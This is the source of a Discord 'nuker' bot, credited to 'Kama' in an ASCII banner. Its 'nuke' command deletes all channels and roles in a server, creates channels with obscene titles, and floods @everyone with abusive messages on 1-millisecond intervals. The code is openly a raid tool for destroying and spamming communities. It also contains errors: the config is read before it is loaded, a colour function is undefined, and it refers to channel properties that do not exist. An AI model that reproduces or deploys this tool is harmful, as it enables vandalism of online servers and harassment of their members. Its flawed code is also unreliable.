const {
  Client,
  ActivityType,
  Partials,
  GatewayIntentBits,
  Collection,
} = require("discord.js");
const { Guilds, GuildMembers, GuildMessages } = GatewayIntentBits;
const { User, Message, GuildMember, ThreadMember } = Partials;

const client = new Client({
  intents: [Guilds, GuildMembers, GuildMessages],
  partials: [User, Message, GuildMember, ThreadMember],
});
client.login(client.config.TOKEN);
client.config = require("./config.json");
let aSName = `

▄▄▄       ██▀███  ▒███████▒▓█████  ██▀███   ▒█████  ▒██   ██▒  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
▒████▄    ▓██ ▒ ██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ▓██ ░▄█ ▒░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒░░  █   ░░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██ ▒██▀▀█▄    ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒   ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
▓█   ▓██▒░██▓ ▒██▒▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
▒▒   ▓▒█░░ ▒▓ ░▒▓░░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒   ▒▒ ░  ░▒ ░ ▒░░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
 ░   ▒     ░░   ░ ░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒   ░    ░  ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
     ░  ░   ░       ░ ░       ░  ░   ░         ░ ░   ░    ░        ░                 ░  ░       ░          ░      ░  ░   ░     
                  ░                                                                                                            
                                           
                                                     
                           Dev by Kama
                   Nuker: ${client.user.tag}
                   Prefix: ${client.config.prefix}
   `;
client.on('ready', () => {
  console.clear();
  console.log(red(aSName));
});

client.on('message', async (message) => {
if( message.content.toLowerCase().startsWith(client.config.prefix + "nuke")) {
  message.guild.channels.forEach(channel => channel.delete());
  message.guild.roles.cache.forEach(roles => {
    roles.delete()
    .then(deleted => console.log(`Deleted role ${deleted.name}`))
    .catch(console.error);
  });
  message.guild.channels.create(`Fucked by ${message.author.username}`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) });
  message.channel.createWebhook(`Fucked by ${message.author.username}`)
    .then(wb => message.channel.send(`@everyone you are getting fucked by ${message.author.username} and God Kama`))
    .catch(console.error)
    setInterval(() => {
      message.guild.channels.forEach(channel => channel.wb.send("@everyone fucked by Kama"))
    }, 1);
    setInterval(() => {
      message.guild.channels.forEach(channel => channel.wb.send("@everyone dev by Kama"))
    }, 1);
  }
});
